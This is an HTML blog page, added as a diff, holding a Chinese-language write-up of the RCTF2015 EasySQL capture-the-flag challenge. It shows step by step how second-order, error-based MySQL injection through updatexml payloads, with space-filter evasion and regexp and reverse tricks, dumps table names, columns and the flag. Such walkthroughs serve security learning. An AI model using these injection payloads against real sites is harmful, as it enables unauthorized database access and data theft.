@@ -1,0 +1,248 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[RCTF2015]EasySQL - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[RCTF2015]EasySQL进入界面，只有登录注册，注册登陆后发现修改密码功能，尝试修改，没啥东西
+然后还有一些诗句，尝试了一下文件包含，无果
+题目是easysql，应该是注入没错了
+注入点呢,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[RCTF2015]EasySQL</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[RCTF2015]EasySQL</h1>
+        <div class="stuff">
+            <span>六月 29, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>进入界面，只有登录注册，注册登陆后发现修改密码功能，尝试修改，没啥东西</p>
+<p>然后还有一些诗句，尝试了一下文件包含，无果</p>
+<p>题目是easysql，应该是注入没错了</p>
+<p>注入点呢，我们可以发现在登陆后，会给出</p>
+<p>hello，your name</p>
+<p>猜测name是注入点，然后尝试admin’和admin”</p>
+<p>然后，admin”改密码的时候出现了报错</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” and pwd=’c4ca4238a0b923820dcc509a6f75849b’’ at line 1</p>
+<p>猜测语句</p>
+<pre><code>    update users set password=&quot;xx&quot; where username=&quot;1&quot; and pwd=&quot;12312312312&quot;</code></pre>
+<p>使用报错注入，空格用()过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~article,flag,users&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flag&#39;))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~flag&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~RCTF&#123;Good job! But flag not her&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再看看users表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~name,pwd,email,real_flag_1s_her&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查real列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_her))from(users))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Table &#39;web_sqli.user&#39; doesn&#39;t exist</span><br></pre></td></tr></table></figure>
+
+<p>结果是该列不存在，所以上次查询显示的结果并不完全，我们采用正则匹配查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&quot;^real&quot;))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~real_flag_1s_here&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查询该列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx&#39;</span><br></pre></td></tr></table></figure>
+
+<p>还是用正则匹配试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;~flag&#123;5dd0ef9c-d227-470e-a526-c8&#39;</span><br></pre></td></tr></table></figure>
+
+<p>长度做了限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;^updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;)))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>查询结果倒叙输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#39;&#125;0b811081c78c-625a-e074-722d-c9f&#39;</span><br></pre></td></tr></table></figure>
+
+<p>利用python倒序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;&#125;0b811081c78c-625a-e074-722d-c9f&#x27;</span></span><br><span class="line">s=s[::<span class="number">-1</span>]</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p>拼接一下</p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr被ban了不然也可以用substr</span><br></pre></td></tr></table></figure>
+
+
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
